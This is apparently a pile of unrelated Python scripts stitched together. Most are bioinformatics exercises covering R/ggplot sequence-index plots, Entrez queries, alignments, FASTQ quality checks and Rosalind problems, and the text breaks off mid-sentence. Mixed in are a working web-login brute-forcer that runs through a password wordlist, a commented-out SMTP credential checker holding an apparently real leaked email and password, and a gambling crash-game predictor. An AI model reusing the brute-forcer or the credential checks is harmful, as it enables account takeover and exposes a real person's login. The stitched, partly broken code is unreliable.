from rpy2.robjects.conversion import localconverter


read_delim = robjects.r('read.delim')
seq_data = read_delim('sequence.index', header=True, stringsAsFactors=False)
#In R:
#  seq.data <- read.delim('sequence.index', header=TRUE, stringsAsFactors=FALSE)

print('This data frame has %d columns and %d rows' % (seq_data.ncol, seq_data.nrow))
print(seq_data.colnames)

#In R:
#  print(colnames(seq.data))
#  print(nrow(seq.data))
#  print(ncol(seq.data))

print('Columns in Python %d ' % robjects.r.ncol(seq_data)[0])

#access some functions
as_integer = robjects.r('as.integer')
match = robjects.r.match

my_col = match('READ_COUNT', seq_data.colnames)[0] # Vector returned
print('Type of read count before as.integer: %s' % seq_data[my_col - 1].rclass[0])
seq_data[my_col - 1] = as_integer(seq_data[my_col - 1])
print('Type of read count after as.integer: %s' % seq_data[my_col - 1].rclass[0])

my_col = match('BASE_COUNT', seq_data.colnames)[0] # Vector returned
seq_data[my_col - 1] = as_integer(seq_data[my_col - 1])

my_col = match('CENTER_NAME', seq_data.colnames)[0]
seq_data[my_col - 1] = robjects.r.toupper(seq_data[my_col - 1])
robjects.r.assign('seq.data', seq_data)
robjects.r('print(c("Column names in R: ",colnames(seq.data)))')

robjects.r('seq.data <- seq.data[seq.data$WITHDRAWN==0, ]')
#Lets remove all withdrawn sequences

robjects.r("seq.data <- seq.data[, c('STUDY_ID', 'STUDY_NAME', 'CENTER_NAME', 'SAMPLE_ID', 'SAMPLE_NAME', 'POPULATION', 'INSTRUMENT_PLATFORM', 'LIBRARY_LAYOUT', 'PAIRED_FASTQ', 'READ_COUNT', 'BASE_COUNT', 'ANALYSIS_GROUP')]")
#Lets shorten the dataframe

#Population as factor
robjects.r('seq.data$POPULATION <- as.factor(seq.data$POPULATION)')

ggplot2.theme = SignatureTranslatedFunction(ggplot2.theme,
                                            init_prm_translate = {'axis_text_x': 'axis.text.x'})
bar = ggplot2.ggplot(seq_data) + ggplot2.geom_bar() + ggplot2.aes_string(x='CENTER_NAME') + ggplot2.theme(axis_text_x=ggplot2.element_text(angle=90, hjust=1))
robjects.r.png('out.png')
bar.plot()
dev_off = robjects.r('dev.off')
dev_off()
Image(filename='out.png')

robjects.r('yri_ceu <- seq.data[seq.data$POPULATION %in% c("YRI", "CEU") & seq.data$BASE_COUNT < 2E9 & seq.data$READ_COUNT < 3E7, ]')
yri_ceu = robjects.DataFrame('yri_ceu')

scatter = ggplot2.ggplot(yri_ceu) + ggplot2.aes_string(x='BASE_COUNT', y='READ_COUNT', shape='factor(POPULATION)', col='factor(ANALYSIS_GROUP)') + ggplot2.geom_point()
robjects.r.png('out.png')
scatter.plot()
dev_off = robjects.r('dev.off')
dev_off()
Image(filename='out.png')
pandas2ri.activate()


with (robjects.default_converter + pandas2ri.converter).context():
  pd_from_r_df = robjects.conversion.get_conversion().rpy2py(yri_ceu)

pd_yri_ceu = pandas2ri.rpy2py_dataframe('yri_ceu')
print(type(pd_yri_ceu))

del pd_yri_ceu['PAIRED_FASTQ']


with (robjects.default_converter + pandas2ri.converter).context():
  r_from_pd_df = robjects.conversion.get_conversion().py2rpy(pd_yri_ceu)
robjects.r.assign('no.paired', r_from_pd_df)
robjects.r("print(colnames(no.paired))")

import re

'''
    function for reading HUMMER output file return list of id desired using regex
        Input:
            :param input : filepath 
        Output:
            :return list() : list of ids to be used again
'''


def readHUMMEROutput(filepath):
    pattern = re.compile(r"\w+_\d*.\d")
    id_list = []
    with open(filepath, 'r') as f:
        for line in f:
            id_found = pattern.findall(line)
            if id_found:
                for id in id_found:
                    id_list.append(id)
    f.close()
    return id_list


'''
    function for writing the output file after processes 
        Input:
            :param dict(): dictionary storing the ids and seqs
            :param outputfile: output file name
            :param formatter: formatter for outputfile
        Output:
            :return file: output file that have the seqs and ids as fasta file 
'''


def writeSeqs(seq_dict, outputfile, formatter):
    with open(outputfile, 'w') as output:
        for id_seq in seq_dict:
            seq = seq_dict[id_seq]
            seq = [seq[i:i + formatter] for i in range(0, len(seq), formatter)]
            output.write(f">{id_seq}\n")
            for line in seq:
                output.write(f"{line}\n")
    output.close()


def getGeneByIndex(seq_dict, id, start, end):
    return seq_dict[id][start - 1:end]

import hashlib
import hmac
import math
import csv
import os
import math
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
from sklearn.neighbors import KNeighborsRegressor


def getPrevHash(currHash):
    prevHash = hashlib.sha256()
    prevHash.update(currHash)
    return prevHash.hexdigest().encode("utf-8")


def hmacDivisible(hmacHash, mod):
    val = 0

    o = len(hmacHash) % 4

    i = o - 4 if o > 0 else 0

    while i < len(hmacHash):
        val = ((val << 16) + int(hmacHash[i: i + 4], 16)) % mod
        i += 4

    return (val == 0)


def getCrashFromHash(currHash):
    hmacCalculator = hmac.new(currHash, digestmod=hashlib.sha256)
    hmacCalculator.update(b"000000000000000007a9a31ff7f07463d91af6b5454241d5faf282e5e0fe1b3a")
    hmacHash = hmacCalculator.hexdigest().encode("utf-8").decode()
    if hmacDivisible(hmacHash, 101):
        return 0
    h = int(hmacHash[0: 13], 16)
    e = math.pow(2, 52)
    return (math.floor((100 * e - h) / (e - h)) / 100)


limit = 100000
gameHash = input("Please enter a game hash to start with: ").encode("utf-8")
print("Writing past crashes to 'crashes.txt'...")
currHash = gameHash
outputFile = open(os.path.join(os.path.dirname(__file__), "crashes.csv"), "w")
csvWriter = csv.writer(outputFile)
csvWriter.writerow(["Game Hash", "Crash"])
for i in range(limit):
    csvWriter.writerow([currHash.decode(), str(getCrashFromHash(currHash))])
    currHash = getPrevHash(currHash)
outputFile.close()
print("Write complete!")

crashes = pd.read_csv(os.path.join(os.path.dirname(__file__), "crashes.csv"))
crashes = crashes.query("Crash < 10")
crashes = crashes.assign(Time=list(range(len(crashes))), Normalized_Crash=crashes["Crash"].apply(np.floor))

regressor = KNeighborsRegressor(n_neighbors=20)
attributes = crashes["Time"].values.reshape(-1, 1)
labels = crashes["Crash"]
train_x = attributes[:-44000]
test_x = attributes[-44000:]
train_y = labels[:-44000]
test_y = labels[-44000:]
regressor.fit(train_x, train_y)
prediction = regressor.predict(test_x)
print(prediction)
plt.scatter(test_x, test_y, color="black")
plt.plot(test_x, prediction, color="blue", linewidth=3)
plt.show()

from Bio import Entrez, SeqIO

Entrez.email = "jaguaryehia4@gmail.com"

# This gives you the list of available databases
handle = Entrez.einfo()
rec = Entrez.read(handle)
handle.close()
print(rec.keys(),'\n\n')

print(rec['DbList'],'\n\n')
handle = Entrez.esearch(db="nucleotide", term='CRT[Gene Name] AND "Plasmodium falciparum"[Organism]', retmax="40")
rec_list = Entrez.read(handle)
handle.close()

print(rec_list['Count'],'\n\n')
print(len(rec_list['IdList']),'\n\n')
print(rec_list['IdList'],'\n\n')

id_list = rec_list['IdList']
handle = Entrez.efetch(db='nucleotide', id=id_list, rettype='gb')
recs = list(SeqIO.parse(handle, 'gb'))
handle.close()

print(recs,'\n\n')

for rec in recs:
    if rec.name == 'KM288867': # try finding CRT gene in 40 records we fetched
        break
print(rec.name,'\n\n')
print(rec.description,'\n\n')
print(str(rec.seq),'\n\n')

# # import imaplib
# # import email
# #
# # imap_server= "imap.world4you.com"
# # email_address = "mailtest@neuralnine.com"
# # password = "mailtest123"
# #
# # imap = imaplib.IMAP4_SSL(imap_server)
# # imap.login(email_address, password)
# # imap.select("Inbox")
# # _,msg=imap.search(None,"ALL")
# 
# 
# #
# #
# # # Credentials
# # email_address = "MemonaRolfzen@terra.com.br"
# # password = "1978lena"
# #
# # # Check the credentials
# # if check_credentials(email_address, password):
# #     print("Login successful")
# # else:
# #     print("Login failed")
# 
# 
# import smtplib
# #
# #
# def check_credentials(email_address, password):
#     try:
#         # Connect to the SMTP server
#         smtp = smtplib.SMTP('smtp.gmail.com', 587)  # Change to the appropriate SMTP server and port
# 
#         # Start TLS for security
#         smtp.starttls()
# 
#         # Login to the SMTP server
#         smtp.login(email_address, password)
# 
#         # If login was successful, return True
#         return True
#     except smtplib.SMTPAuthenticationError as e:
#         print("Login failed:", str(e))
#         return False
#     finally:
#         smtp.quit()  # Ensure we always quit the SMTP session
# 
# 
# 
# email_address = "MemonaRolfzen@terra.com.br"
# password = "1978lena"
# email_domains = [
#     "gmail.com",
#     "yahoo.com",
#     "hotmail.com",
#     "outlook.com",
#     "aol.com",
#     "icloud.com",
#     "protonmail.com",
#     # Add more domains as needed
# ]
# 
# for domain in email_domains:
#     email_address = f"example@{domain}"
#     password = "example_password"
#     print(f"Checking credentials for {email_address}...")
# 
#     if check_credentials(email_address, password):
#         print(f"Login successful for {email_address}")
#     else:
#         print(f"Login failed for {email_address}")

# from selenium import webdriver
# from selenium.webdriver.common.keys import Keys
# from selenium.webdriver.common.by import By
# driver = webdriver.Firefox()
# driver.get("https://www.google.com")
# driver.find_element(By.NAME, "q").send_keys("javascript")
# driver.find_element(By.NAME,"q").send_keys(Keys.ENTER)
# assert "No results found." not in driver.page_source


import requests, sys
from colorama import Fore, init
init()

def guess_password(target_url, username, wordlist_path, action_type):
   parameters = {"username": username, 'password': '', 'Login': action_type}  # Create a dictionary 'parameters' with username, empty password, and action_type.
   # Open the file containing our wordlist 'rockyou.txt' for reading.
   with open(wordlist_path, 'r') as word_list:
       # Loop through each word in the wordlist.
       for each_word in word_list:
           word = each_word.strip()  # Remove whitespace from the word.
           parameters['password'] = word  # Set the password parameter to the current word.
           # Send an HTTP POST request to the target_url with the current 'parameters'.
           output = requests.post(target_url, data=parameters)
           # Check if the response content does not contain "Login failed".
           if 'Login failed' not in output.content.decode('utf-8'):
         # If the condition is met, print a success message with the found password.
               print(f"{Fore.GREEN} [+] Password Found! >>> {word} ")
               sys.exit()  # Exit the script.
   # If no password is found after iterating through the wordlist, print a failure message.
   print(f"{Fore.RED} [-] Password not found.")
   from math import log
from Bio import pairwise2
from Bio.Align import substitution_matrices

# "ACCGGT", "ACGT" matches score 1, mismatches 0 and no gap penalty.
def exam(userSeq,userSeq2):
  alignments = pairwise2.align.globalxx(userSeq, userSeq2)
  for alignment in alignments:
      print(pairwise2.format_alignment(*alignment))

#  "ACCGGT", "ACGT" ,match=2, mismatch=-1 ,  matches score 2, mismatches -1. No gap penalty.
def exam2(userSeq,userSeq2,matchNum,mismatchNum):
  alignments = pairwise2.align.globalmx(userSeq,userSeq2,matchNum,mismatchNum)
  for alignment in alignments:
      print(pairwise2.format_alignment(*alignment))

# "ACCGGT", "ACGT", open=-2, extend=-1 ,matches score 1, mismatches 0, opening gap -2, extended gap -1
def exam3(userSeq,userSeq2,openNum,extendNum):
  alignments = pairwise2.align.globalxs(userSeq,userSeq2,openNum,extendNum)
  for alignment in alignments:
      print(pairwise2.format_alignment(*alignment))

# "KEVLA", "EVL", "BLOSUM62"
def exam4(seq1,seq2,loadMatrix):
  alignments = pairwise2.align.globaldx(seq1, seq2, match_dict=substitution_matrices.load(loadMatrix))
  for alignment in alignments:
      print(pairwise2.format_alignment(*alignment))

def gap_function(x, y):
     if y == 0:  # No gap
        return 0
     elif y == 1:  # Gap open penalty
        return -2
     return - (2 + y/4.0 + log(y)/2.0)

# matches score 5, mismatches -4, gap penalty defined through function gap_function
# "ACCCCCGT", "ACG", match=5, mismatch=-4

def exam5(seq1,seq2,matchNum,mismatch):
  alignments = pairwise2.align.globalmc(seq1,seq2,match=matchNum,mismatch=mismatch,
                                        gap_A_fn= gap_function, gap_B_fn= gap_function)
  for alignment in alignments:
      print(pairwise2.format_alignment(*alignment))

print(exam("ACCGGT", "ACGT"))
print(exam2("ACCGGT", "ACGT", 2, -1))
print(exam3("ACCGGT", "ACGT", -2, -1))
print(exam4("KEVLA", "EVL", "BLOSUM62"))
print(exam5("ACCCCCGT", "ACG",5,-4))

'''
    lcs
    HMMER
    BLOSUM62
    local
    global
    
'''
import argparse
import datetime
from pathlib import Path
from BioIO import *


class Args:
    def __init__(self):
        self.parser = argparse.ArgumentParser(
            description="This a bioinformatic command line tool help into the biological data analysis")

        self.parser.add_argument("-file", "--path", help="return file that has known type functions")
        self.parser.add_argument("-D", "--dna", help="return dna functions", type=str)
        self.parser.add_argument("-R", "--rna", help="return rna functions", type=str)
        self.parser.add_argument("-p", "--protein", help="return protein functions", type=str)
        # self.parser.add_argument("-tcript","--transcript",help="return transcript of dna or rna sequence", type=str)
        # self.parser.add_argument("-tlate","--translation",help="return translate of dna or rna sequence", type=str)
        # self.parser.add_argument("-comp","--complement",help="return complement", type=str)
        # self.parser.add_argument("-rcomp","--reversecomplement",help="return Reverse Complement", type=str)
        # self.parser.add_argument("-GC","--GCcontent",help="return GC Content", type=str)
        # self.parser.add_argument("-btcript","--backtranscript",help="return back Transcript", type=str)
        self.args = self.parser.parse_args()
        self.bio = None

    def getArgs(self):
        return self.args

    def printFunction(self, data):
        if data == 'dna':
            print(
                '1. Translation\n2. Transcription\n3. Complement\n4. Reverse Complement\n5. GC Content\n6. Back Transcript')

            self.parser.add_argument("-tcript", "--transcript", help="return transcript of dna or rna sequence",
                                     type=str)
            self.parser.add_argument("-tlate", "--translation", help="return translate of dna or rna sequence",
                                     type=str)
            self.parser.add_argument("-comp","--complement",help="return complement", type=str)
            self.parser.add_argument("-rcomp","--reversecomplement",help="return Reverse Complement", type=str)
            self.parser.add_argument("-GC","--GCcontent",help="return GC Content", type=str)
            self.parser.add_argument("-btcript","--backtranscript",help="return back Transcript", type=str)
        elif data == 'rna':
            print('rna data')
            '''
            translation
            rcomplement
            complement
            back transcript
            
            '''
        elif data == 'protein':
            '''complement
                rcomplement
                 
            '''
            print('pro data')
        else:
            print(f'What do you wanna do to your file: ')
        # print('7. transcription')
        # print('8. transcription')
        # print('9. transcription')
        # print('10. transcription')

    def DataType(self):
        if self.args.dna:
            print(f'What function do you wanna do on this seq: {self.args.dna}')
            self.bio = BioIO(self.args.dna)
            self.printFunction('dna')

        elif self.args.rna:
            print(f'What function do you wanna do on this seq: {self.args.rna}')
            self.printFunction('rna')
        elif self.args.protein:
            print(f'What function do you wanna do on this seq: {self.args.protein}')
            self.printFunction('protein')
        elif self.args.file:
            print(f'What function do you wanna do on this file: {self.args.file}')
            self.printFunction('file')
        else:
            print(f'Wrong arguments')
import gzip
from Bio import SeqIO
from collections import Counter
from collections import defaultdict
import seaborn as sns
import matplotlib.pyplot as plt
import itertools

def qualityPlot(recs):
    qual_pos = defaultdict(list)
    for rec in recs:
        for i, qual in enumerate(rec.letter_annotations['phred_quality']):
            if i < 25 or qual == 40:
                continue
            pos = i + 1
            qual_pos[pos].append(qual)
    vps = []
    poses = list(qual_pos.keys())
    poses.sort()
    for pos in poses:
        vps.append(qual_pos[pos])
    fig, ax = plt.subplots(figsize=(16, 9))
    sns.boxplot(data=vps, ax=ax)
    ax.set_xticklabels([str(x) for x in range(26, max(qual_pos.keys()) + 1)])
    plt.show()


def quality(recs):
    cnt_qual = defaultdict(int)
    for rec in recs:
        for i, qual in enumerate(rec.letter_annotations['phred_quality']):
            if i < 25:
                continue
            cnt_qual[qual] += 1
    for qual, cnt in cnt_qual.items():
        print('%d: %.2f %d' % (qual, 100. * cnt / sum(cnt_qual.values()), cnt))

def Nuncalled(recs):
    n_cnt = defaultdict(int)
    for rec in recs:
        for i, letter in enumerate(rec.seq):
            pos = i + 1
            if letter == 'N':
                n_cnt[pos] += 1
    seq_len = max(n_cnt.keys())
    positions = range(1, seq_len + 1)
    fig, ax = plt.subplots(figsize=(16, 9))
    ax.plot(positions, [n_cnt[x] for x in positions])
    ax.set_xlim(1, seq_len)
    plt.show()


def basesPrescent(recs):
    count = Counter()
    for rec in recs:
        count.update(rec.seq)
    for letter, co in count.items():
        print('%s: %.2f %d' % (letter, 100. * co / sum(count.values()), co))


def getDetail(recs):
    rec = next(recs)
    print(rec)
    print(rec.id, rec.description, rec.seq)
    print(rec.letter_annotations)


def read_FASTQ_File(filename):
    print(f'Reading FASTQ...{filename}')
    if filename.endswith('.fastq.gz'):
        try:
            f = SeqIO.parse(gzip.open(filename, 'rt', encoding='utf-8'), 'fastq')
            # Check the gzip header to confirm if the file is valid

        except OSError:
            f = SeqIO.parse(filename, 'fastq')
    elif filename.endswith('.fastq'):
        f = SeqIO.parse(filename, 'fastq')
    else:
        raise ValueError("Invalid file extension: {}".format(filename))
    return f

z=read_FASTQ_File('/content/SRR003265.filt.fastq.gz')

print(getDetail(z))
print(basesPrescent(z))
print(Nuncalled(z))
print(quality(z))
print(qualityPlot(z))


from Bio import Entrez, SeqIO


Entrez.email = 'jaguaryehia4@gmail.com'

def accessing():
  handle = Entrez.einfo()
  rec = Entrez.read(handle)
  handle.close()
  print(rec.keys())
  print(rec['DbList'])
  searching()

def searching():
  # CRT[Gene Name] AND "Plasmodium falciparum"[Organism]
  ip = 'CRT[Gene Name] AND "Plasmodium falciparum"[Organism]'
  handle = Entrez.esearch(db="nucleotide", term=ip, retmax="40")
  rec_list = Entrez.read(handle)
  handle.close()
  print(rec_list['Count'])
  print(len(rec_list['IdList']))
  print(rec_list['IdList'])
  handle = Entrez.efetch(db='nucleotide', id=rec_list['IdList'], rettype='gb')
  recs = list(SeqIO.parse(handle, 'gb'))
  handle.close()
  print(recs)
  searchDetails(recs)

def searchDetails(recs):
  for rec in recs:
    if rec.name == 'KM288867': # try finding CRT gene in 40 records we fetched
        break
  print(rec.name)
  print(rec.description)
  print(str(rec.seq))

accessing()
import Bio
from Bio.Blast import NCBIXML, NCBIWWW
from Bio.Seq import Seq
import os
import argparse
import pandas as pd
import gzip
from Bio import SeqIO
from collections import Counter
from Bio.SeqUtils import GC
from Bio.SeqUtils import gc_fraction
from Bio.Data import CodonTable
from Bio.Seq import MutableSeq
import itertools as it
from itertools import compress


def Transcribe(dna):
    return Seq(dna).upper().transcribe()


def gc_Fraction(dna):
    return gc_fraction(Seq(dna).upper())


def gc_Percentage(dna):
    return GC(Seq(dna).upper())


def Reverse_Complement(dna):
    return Seq(dna).upper().reverse_complement()


def back_Transcribe(dna):
    return Seq(dna).upper().back_transcribe()


def Complement(dna):
    return Seq(dna).upper().complement()


def getTablesCodons():
    pass



def mutations(dna, target_base_wanna_mutate=None, new_base=None, opr=None):
    if opr == 'removeonebase':
        if isinstance(target_base_wanna_mutate, str):
            return Seq(dna).replace(target_base_wanna_mutate, '')

    elif opr == 'removeallsamebase':
        if isinstance(target_base_wanna_mutate, str):
            return Seq(dna).replace(target_base_wanna_mutate, '')

    elif opr == 'mutatebase':
        if isinstance(target_base_wanna_mutate, str) and isinstance(new_base, str):
            return Seq(dna).replace(target_base_wanna_mutate, new_base)

    elif opr == 'removeambiguity':
        ambiguous_bases = set('NRYWSMKHBVD')
        mask = [base not in ambiguous_bases for base in Seq(dna)]
        return ''.join(compress(Seq(dna), mask))

    elif opr == 'compress':
        if isinstance(target_base_wanna_mutate, str):
            mask = [base != target_base_wanna_mutate for base in Seq(dna)]
            return ''.join(compress(Seq(dna), mask))

        # Handle unknown operation or invalid input
    return None


# if target_base_wanna_mutate is int():
#     target_base_wanna_mutate += 1
#     MutableSeq(dna)[target_base_wanna_mutate] = new_base


# mutable_seq[5] = "C"
# mutable_seq


def dna_Translation(dna):
    return Seq(dna).upper().translate()


def rna_Reverse_Complement(dna):
    return Seq(dna).upper().reverse_complement_rna()


# def KnownEXE(filename):
#     if filename.endswith('.vcf') or filename.endswith('.vcf.gz'):
#         return read_VCF_File(filename)
#     elif filename.endswith('.fastq') or filename.endswith('.fastq.gz'):
#         return read_FASTQ_File(filename)
#     elif filename.endswith('.fasta') or filename.endswith('.fasta.gz'):
#         return read_FASTA_File(filename)


# def distribution_Nucleotide_Reads(recs):
#     # Read sequences and count letters using Counter and list comprehension
#     count = Counter(letter for rec in SeqIO.parse(recs, 'fastq') for letter in rec.seq)
#
#     # Print percentage and count for each letter
#     print(f'{letter}: {100. * co / sum(count.values()) :.2f} {count}' for letter, co in count.items())
#
#
# # def Plots():
# #     n_cnt = defaultdict(int)
# #     for rec in recs:
# #         for i, letter in enumerate(rec.seq):
# #             pos = i + 1
# #             if letter == 'N':
# #                 n_cnt[pos] += 1
# #     seq_len = max(n_cnt.keys())
# #     positions = range(1, seq_len + 1)
# #     fig, ax = plt.subplots(figsize=(16, 9))
# #     ax.plot(positions, [n_cnt[x] for x in positions])
# #     ax.set_xlim(1, seq_len)
# #     for rec in recs:
# #         for i, qual in enumerate(rec.letter_annotations['phred_quality']):
# #             if i < 25:
# #                 continue
# #             cnt_qual[qual] += 1
# #     tot = sum(cnt_qual.values())
# #     for qual, cnt in cnt_qual.items():
# #         print('%d: %.2f %d' % (qual, 100. * cnt / tot, cnt))
# #     for rec in recs:
# #         for i, qual in enumerate(rec.letter_annotations['phred_quality']):
# #             if i < 25 or qual == 40:
# #                 continue
# #             pos = i + 1
# #             qual_pos[pos].append(qual)
# #     vps = []
# #     poses = list(qual_pos.keys())
# #     poses.sort()
# #     for pos in poses:
# #         vps.append(qual_pos[pos])
# #     fig, ax = plt.subplots(figsize=(16, 9))
# #     sns.boxplot(data=vps, ax=ax)
# #     ax.set_xticklabels([str(x) for x in range(26, max(qual_pos.keys()) + 1)])
#

def seq_Type(seq):
    if 'A' and 'T' and 'G' and 'C' in seq:
        return '--dna'
    elif 'A' and 'U' and 'G' and 'C' in seq:
        return '--rna'
    elif 'ABCDEFGHIKLMNPQRSTVWXYZabcdefghiklmnpqrstvwxyz' in seq:
        return '--protein'
    else:
        return '--path'


#
#
# def get_FASTQ_Info(recs):
#     rec = next(recs)
#     print(rec)
#     print(rec.id, rec.description, rec.seq)
#     print(rec.letter_annotations)
#
#

def read_GenBank_file(filename):
    print(f'Reading GenBank file...{filename}')
    if filename.endswith('.gbk.gz'):
        try:
            f = SeqIO.parse(gzip.open(filename, 'rt', encoding='utf-8'), 'genbank')
            # Check the gzip header to confirm if the file is valid
            f.read(1)
            f.seek(0)
        except OSError:
            f = SeqIO.parse(filename, 'genbank')
    elif filename.endswith('.gbk'):
        f = SeqIO.parse(filename, 'genbank')
    else:
        raise ValueError("Invalid file extension: {}".format(filename))
    return f


def read_FASTA_File(filename):
    print(f'Reading FASTA...{filename}')
    if filename.endswith('.fasta.gz'):
        try:
            f = SeqIO.parse(gzip.open(filename, 'rt', encoding='utf-8'), 'fasta')
            # Check the gzip header to confirm if the file is valid
            f.read(1)
            f.seek(0)
        except OSError:
            f = SeqIO.parse(filename, 'fasta')
    elif filename.endswith('.fasta'):
        f = SeqIO.parse(filename, 'fasta')
    else:
        raise ValueError("Invalid file extension: {}".format(filename))
    return f

#
def getFromBlast(file_query):
    fasta_string = open(file_query).read()
    result_handle = NCBIWWW.qblast("blastn", "nt", fasta_string)

    with open("my_blast.xml", "w") as save_to:
        save_to.write(result_handle.read())
        result_handle.close()

    with open("my_blast.xml") as result_handle:
        print(result_handle)

    E_VALUE_THRESH = 0.04

    result_handle = open("my_blast.xml", 'r')
    blast_records = NCBIXML.parse(result_handle)
    blast_record = next(blast_records)

    for alignment in blast_record.alignments:
        for hsp in alignment.hsps:
            if hsp.expect < E_VALUE_THRESH:
                print('****Alignment****')
                print('sequence:', alignment.title)
                print('length:', alignment.length)
                print('e value:', hsp.expect)
                print(hsp.query[0:75] + '...')
                print(hsp.match[0:75] + '...')
                print(hsp.sbjct[0:75] + '...')


def getFromBlast2(file_query):
    # file_query
    fasta_string = open(file_query).read()
    result_handle = NCBIWWW.qblast("blastn", "nt", file_query)
    result = open('my_blast.xml', 'r')
    blast_records = NCBIXML.parse(result)
    blast_record = next(blast_records)

    arr = []

    E_VALUE_THRESH = 0.00000000001
    count = 0
    for record in blast_records:
        for alignment in blast_record.alignments:
            for hsp in alignment.hsps:
                if hsp.expect < E_VALUE_THRESH:
                    count += 1

                arr.append({"sequence:": alignment.title,
                            "length:": alignment.length,
                            "query": hsp.query[0:75] + "...",
                            "match": hsp.match[0:75] + "...",
                            "sbjct": hsp.sbjct[0:75] + "..."})

    print(f"There are {count} similar sequences in Blast output")

    with open('annotations_seq.txt', 'w') as f:
        for annotation in arr:
            for i in annotation.keys():
                f.write(f'{i}:{annotation[i]}\n')


# def read_VCF_File(filename):
#     print(f'Reading VCF...{filename}')
#     if filename.endswith('.vcf.gz'):
#         try:
#             f = gzip.open(filename, 'rt', encoding='utf-8')
#             # Check the gzip header to confirm if the file is valid
#             f.read(1)
#             f.seek(0)
#         except OSError:
#             f = open(filename, 'r', encoding='utf-8')
#     elif filename.endswith('.vcf'):
#         f = open(filename, 'r', encoding='utf-8')
#     else:
#         raise ValueError("Invalid file extension: {}".format(filename))
#
#     header = []
#     data1 = []
#     data2 = []
#     for line in f:
#         if line.startswith('#CHROM'):
#             header.append(line.strip())
#         if line.startswith('#'):
#             data2.append(line)
#         else:
#             data1.append(line.strip())
#     f.close()
#     header = header[0].split('\t')
#     data1 = [line.split('\t') for line in data1]
#     dataframe = pd.DataFrame(data1, columns=header)
#     return dataframe

from BioHandling import *


class BioIO:
    def __init__(self, data):
        self.Data = data

    def getType(self):
        return seq_Type(self.Data)

    # def dna(self):

# from argHandling import *



# args = Args()
# arg = args.getArgs()
# args.DataType()

from collections import Counter
from Bio.Seq import Seq

"""
Problem 1:

    A string is simply an ordered collection of symbols selected from some alphabet and formed into a word;
    the length of a string is the number of symbols that it contains.
    An example of a length 21 DNA string (whose alphabet contains the symbols 'A', 'C', 'G', and 'T') is
    "ATGCTTCAGAAAGGTCTTACG."

    Given: A DNA string s of length at most 1000 nt.

    Return: Four integers (separated by spaces) counting the respective number of times
    that the symbols 'A', 'C', 'G', and 'T' occur in s

    Sample Dataset

            AGCTTTTCATTCTGACTGCAACGGGCAATATGTCTCTGTGTGGATTAAAAAAAGAGTGTCTGATAGCAGC

    Sample Output

            20 12 17 21
"""


def count_dna_symbols(dna_string):
    return Counter(Seq(dna_string))['A'], Counter(Seq(dna_string))['C'], Counter(Seq(dna_string))['G'], \
           Counter(Seq(dna_string))['T']


print(count_dna_symbols("AGCTTTTCATTCTGACTGCAACGGGCAATATGTCTCTGTGTGGATTAAAAAAAGAGTGTCTGATAGCAGC"))

"""

    Problem 2:

        An RNA string is a string formed from the alphabet containing 'A', 'C', 'G', and 'U'.
        Given a DNA string t
        corresponding to a coding strand, its transcribed RNA string u is formed by replacing 
        all occurrences of 'T' in t with 'U' in u

        Given: A DNA string t having length at most 1000 nt.

        Return: The transcribed RNA string of t

        Sample Dataset

                GATGGAACTTGACTACGTAAATT

        Sample Output

                GAUGGAACUUGACUACGUAAAUU
"""


def transcribe_dna_to_rna(dna_string):
    # Convert the DNA string to a Biopython Seq object for easier manipulation
    seq = Seq(dna_string)

    # Transcribe the DNA sequence to RNA by replacing 'T' with 'U'
    rna_string = seq.transcribe()

    # Return the transcribed RNA string as a regular Python string
    return str(rna_string)


# Sample DNA string
sample_dna_string = "GATGGAACTTGACTACGTAAATT"

# Call the function with the sample DNA string
result = transcribe_dna_to_rna(sample_dna_string)

# Print the result
print(result)

"""

    Problem 3:

    In DNA strings, symbols 'A' and 'T' are complements of each other, as are 'C' and 'G'.
    The reverse complement of a DNA string s is the string sc formed by reversing the symbols of s
    , then taking the complement of each symbol (e.g., the reverse complement of "GTCA" is "TGAC").

        Given: A :DNA string s of length at most 1000 b
    p.

    Re
    turn: The reverse complement sc of s

    Sample Dataset

 
            AAAACCCGGT

    Sample Output

            ACCGGGTTTT
"""


def reverse_complement(dna_string):
    # Convert the DNA string to a Biopython Seq object for easier manipulation
    seq = Seq(dna_string)

    # Get the reverse complement of the DNA sequence
    reverse_complement_seq = seq.reverse_complement()

    # Return the reverse complement as a regular Python string
    return str(reverse_complement_seq)


# Sample DNA string
sample_dna_string = "AAAACCCGGT"

# Call the function with the sample DNA string
result = reverse_complement(sample_dna_string)

# Print the result
print(result)

"""
Problem 4:
    
    A sequence is an ordered collection of objects (usually numbers), which are allowed to repeat. 
    Sequences can be finite or infinite. Two examples are the 
    finite sequence (π,−2–√,0,π) and the infinite sequence of odd numbers (1,3,5,7,9,…). 
    We use the notation an to represent the n-th term of a sequence.
    A recurrence relation is a way of defining the terms of a sequence with respect to the 
    values of previous terms. In the case of Fibonacci's rabbits from the introduction, 
    any given month will contain the rabbits that were alive the previous month, plus any new offspring.
    A key observation is that the number of offspring in any month is equal to the number of rabbits that were 
    alive two months prior. As a result, if Fn
    represents the number of rabbit pairs alive after the n-th month, then we obtain 
    the Fibonacci sequence having terms Fn that are defined by the recurrence relation 
    Fn=Fn−1+Fn−2 (with F1=F2=1 to initiate the sequence). 
    Although the sequence bears Fibonacci's name, 
    it was known to Indian mathematicians over two millennia ago.
    When finding the n-th term of a sequence defined by a recurrence relation, 
    we can simply use the recurrence relation to generate terms for progressively larger values of n
    This problem introduces us to the computational technique of dynamic programming, 
    which successively builds up solutions by using the answers to smaller cases.

    Given: Positive integers n≤40 and k≤5

    Return: The total number of rabbit pairs that will be present after n
    months, if we begin with 1 pair and in each generation, every pair of 
    reproduction-age rabbits produces a litter of k rabbit pairs (instead of only 1 pair).
    
    Sample Dataset
    
            5 3
    
    Sample Output
    
            19
"""

"""
count RNA Nucleotides

"""


def count_rna_nucleotides(rna_string):
    # Convert the RNA string to a Biopython Seq object for easier manipulation
    seq = Seq(rna_string)

    # Use Counter to count the occurrences of each RNA nucleotide in the sequence
    nucleotide_counts = Counter(seq)

    # Return the counts of 'A', 'C', 'G', and 'U' as integers
    return nucleotide_counts['A'], nucleotide_counts['C'], nucleotide_counts['G'], nucleotide_counts['U']


# Sample RNA string
sample_rna_string = "GAUGGAACUUGACUACGUAAAUU"

# Call the function with the sample RNA string
result = count_rna_nucleotides(sample_rna_string)

# Print the result in the required format
print(result)

"""
Problem 6:
    GC Content
"""

from Bio.SeqUtils import GC


def calculate_gc_content(dna_sequence):
    return GC(dna_sequence)


"""
    Problem 6

    Given two strings s and t of equal length, the Hamming distance between s and t,
    denoted dH(s,t), is the number 
